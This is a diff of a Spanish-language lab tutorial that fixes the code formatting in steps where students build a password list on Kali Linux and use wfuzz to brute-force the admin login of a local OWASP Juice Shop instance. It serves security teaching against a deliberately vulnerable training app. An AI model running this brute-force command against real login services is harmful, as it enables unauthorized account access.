@@ -11,7 +11,7 @@ Primero no vamos a usar *rockyou* ni nada grande. Vamos a crear nuestra propia l
 
 1. Abrid una terminal en **Kali Linux**.
 2. Ejecutad:
-    `bashcd ~
+    `cd ~
     nano admin-passlist.txt`
 
 3. Escribid una contraseña por líena. Por ejemplo: 
@@ -32,11 +32,13 @@ Ahora automatizamos el intento de varias contraseñas usando la wordlist que aca
 
 1. En la terminal Kali, ejecutad el siguiente comando (ajustad la ruta de la lista si la guardasteis en otro sitio):
     
-    `bashwfuzz -z file,~/admin-passlist.txt \
+    ```
+    wfuzz -z file,~/admin-passlist.txt \
       -d '{"email":"admin@juice-sh.op","password":"FUZZ"}' \
       -H "Content-Type: application/json" \
       --hc 401 \
-      http://localhost:3000/rest/user/login`
+      http://localhost:3000/rest/user/login
+    ```
 
 - **`z file,~/admin-passlist.txt`** le dice a Wfuzz que use vuestro archivo como fuente de payloads.
 - Donde aparece **`FUZZ`** en el JSON, Wfuzz va sustituyendo cada línea de la wordlist como valor de **`password`**.
